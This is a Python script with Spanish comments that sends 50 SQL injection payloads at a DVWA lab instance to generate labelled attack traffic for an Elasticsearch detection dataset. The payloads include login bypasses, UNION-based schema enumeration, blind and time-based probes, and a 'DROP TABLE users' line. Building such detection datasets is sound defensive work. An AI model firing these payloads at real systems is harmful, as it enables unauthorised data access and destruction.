import requests
import time
import random

# =============================================
# CONFIGURACION
# =============================================
BASE_URL = "http://192.168.20.10"
LOGIN_URL = f"{BASE_URL}/login.php"
CREDENCIALES = {"username": "admin", "password": "password", "Login": "Login"}
PAUSA = 0.5

# =============================================
# PAYLOADS SQLI ENTRENAMIENTO
# =============================================

PAYLOADS_SQLI = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR 1=1--",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1' ORDER BY 3--",
    "1 UNION SELECT null--",
    "1 UNION SELECT null, null--",
    "1' UNION SELECT null, null--",
    "' OR 'x'='x",
    "1; DROP TABLE users--",
    "' AND 1=1--",
    "' AND 1=2--",
    "admin'--",
    "' OR 1=1#",
    "' OR 'a'='a",
    "1' AND SLEEP(2)--",
    "1' AND 1=1 UNION SELECT user(),version()--",
    "' HAVING 1=1--",
    "' GROUP BY 1--",
    "1' AND EXISTS(SELECT * FROM users)--",
    "' OR EXISTS(SELECT * FROM users)--",
    "1' AND ASCII(SUBSTRING(username,1,1))>64--",
    "' UNION SELECT table_name, null FROM information_schema.tables--",
    "' UNION SELECT column_name, null FROM information_schema.columns--",
    "' OR 1=1 LIMIT 1--",
    "' OR 1=1 LIMIT 1 OFFSET 1--",
    "1' AND (SELECT COUNT(*) FROM users)>0--",
    "1' AND LENGTH(username)>3--",
    "' OR SUBSTRING(username,1,1)='a'--",
    "' OR username LIKE '%admin%'--",
    "' OR username IS NOT NULL--",
    "1 AND 1=1",
    "1 AND 1=2",
    "' UNION ALL SELECT null--",
    "' UNION ALL SELECT null,null--",
    "' UNION ALL SELECT null,null,null--",
    "1' ORDER BY 1 ASC--",
    "1' ORDER BY 1 DESC--",
    "' OR '1'='1' /*",
    "' OR 1=1/*",
    "admin' #",
    "' OR 2=2--",
    "' OR 3=3--",
    "1' AND 2=2--",
    "' OR 'b'='b",
    "' OR 'c'='c",
    "1' UNION SELECT 1,2--",
    "1' UNION SELECT 1,2,3--",
    "' OR id=1--",
]

# =============================================
# FUNCIONES
# =============================================

def login(session):
    r = session.get(LOGIN_URL)
    token = None
    for line in r.text.split('\n'):
        if 'user_token' in line and 'value' in line:
            try:
                token = line.split('value=')[1].split("'")[1]
                break
            except:
                pass
    if token:
        CREDENCIALES['user_token'] = token
    r = session.post(LOGIN_URL, data=CREDENCIALES)
    if "Login failed" in r.text:
        print("ERROR: No se pudo hacer login en DVWA")
        return False
    print("Login correcto en DVWA")
    return True

def ataque_sqli(session):
    print("\n[*] Iniciando ataques SQLi...")
    payloads = PAYLOADS_SQLI.copy()
    random.shuffle(payloads)
    ok = 0
    for payload in payloads:
        try:
            r = session.get(f"{BASE_URL}/vulnerabilities/sqli/",
                            params={"id": payload, "Submit": "Submit"})
            print(f"  SQLi | {payload[:50]:<50} | status: {r.status_code}")
            ok += 1
            time.sleep(PAUSA)
        except Exception as e:
            print(f"  ERROR: {e}")
    print(f"[+] SQLi completado: {ok}/{len(payloads)} peticiones enviadas")

# =============================================
# MAIN
# =============================================

if __name__ == "__main__":
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})

    print("="*60)
    print("  ENTRENAMIENTO: SQL INJECTION")
    print("  Target: " + BASE_URL)
    print("  Etiqueta Elasticsearch: 'sqli'")
    print("  AVISO: Asegurate de tener tcpdump corriendo en el router")
    print("="*60)
    input("\nPulsa ENTER cuando tcpdump este corriendo...")

    if not login(session):
        exit(1)

    ataque_sqli(session)

    print("\n" + "="*60)
    print("  COMPLETADO.")
    print("  Para el tcpdump, guarda el pcap y subelo a Elasticsearch")
    print("  con etiqueta: 'sqli'")
    print("="*60)

#Tráfico normal: 30 peticiones
#SQLi: 30 peticiones
#XSS: 30 peticiones
#Brute: 30 peticiones
#Exec: 30 peticiones